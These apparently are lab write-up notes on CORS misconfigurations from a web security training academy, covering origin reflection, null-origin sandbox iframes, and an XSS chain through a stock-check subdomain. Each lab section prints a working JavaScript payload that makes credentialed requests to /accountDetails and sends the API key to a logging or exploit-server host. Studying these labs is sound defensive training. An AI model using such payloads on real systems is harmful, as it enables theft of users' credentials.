# Cross-origin resource sharing (CORS)
Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain.

## Same-origin policy (SOP)
The same-origin policy is a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain.

## Access-Control-Allow-Origin response header
- The `Access-Control-Allow-Origin` header is included in the response from one website to a request originating from another website, and identifies the permitted origin of the request.
- The default behavior of cross-origin resource requests is for requests to be passed without credentials like cookies and the Authorization header. However, the cross-domain server can permit reading of the response when credentials are passed to it by setting the CORS `Access-Control-Allow-Credentials` header to true.

### LAB: CORS vulnerability with basic origin reflection
- API key is retrieved via an AJAX request to `/accountDetails`.
- The response contains the `Access-Control-Allow-Credentials`.
- Add the Origin: http://example.com header and notice that the origin is reflected in the `Access-Control-Allow-Origin` header.
    
Use this script to make a request to `/accountDetails` and append the response to be viewed at the listening server:

    <script>
        var req = new XMLHttpRequest();
        req.onreadystatechange = function () {
            if (req.readyState == XMLHttpRequest.DONE) {
            fetch("/log?key=" + req.responseText);
            }
        };
        req.open(
            "get",
            "https://0a56008a041a40ea819b0c5500690014.web-security-academy.net/accountDetails",
            true
        );
        req.withCredentials = true;
        req.send(null);
    </script>

### LAB: CORS vulnerability with trusted null origin
The specification for the Origin header supports the value null. Browsers might send the value null in the Origin header in various unusual situations:
- Cross-origin redirects.
- Requests from serialized data.
- Request using the file: protocol.
- Sandboxed cross-origin requests.

To solve this lab, use a null origin resource like sandbox:

    <iframe
        sandbox="allow-scripts"
        src="data:text/html,
        <script>
            var xhr = new XMLHttpRequest();
            xhr.onload = function() {
                location='https://exploit-0aa500ee044a9e7880e02fd701760058.exploit-server.net/exploit?log='+this.responseText;
            }
            xhr.open('GET', 'https://0a0b002304e49eae8093308d00820077.web-security-academy.net/accountDetails', true);
            xhr.withCredentials = true;
            xhr.send();
        </script>"
    ></iframe>

### LAB: CORS vulnerability with trusted insecure protocols
- Test that every subdomain of the server is allowed to read the response by adding the header Origin: https://subdomain.0a81003d04b8c7c980555391009f0001.web-security-academy.net
- Notice the check stock endpoint is a valid Origin and has XSS vulnerability in the `productId` parameter. Take advantage of that and make this endpoint request to the `/accountDetails` endpoint

Use this script and deliver it to the victim and obtain the API key in the listening server:

    <script>
        location = "http://stock.0a81003d04b8c7c980555391009f0001.web-security-academy.net/?storeId=1&productId=2<script>var req=new XMLHttpRequest();req.onreadystatechange=function(){if(req.readyState == XMLHttpRequest.DONE){fetch("https://exploit-0a52004204d7c79880b9523401890016.exploit-server.net/log?key="+req.responseText);}};req.open("get","https://0a81003d04b8c7c980555391009f0001.web-security-academy.net/accountDetails",true);req.withCredentials=true;req.send(null);</script>"
    </script>
The response would be:

    <h4>ERROR</h4>
    Invalid product ID: 2
    <script>
        var req=new XMLHttpRequest();
        req.onreadystatechange=function(){
            if(req.readyState == XMLHttpRequest.DONE){
                fetch("https://exploit-0a52004204d7c79880b9523401890016.exploit-server.net/log?key="+req.responseText);
            }
        };
        req.open("get","https://0a81003d04b8c7c980555391009f0001.web-security-academy.net/accountDetails",true);
        req.withCredentials=true;
        req.send(null);
    </script>
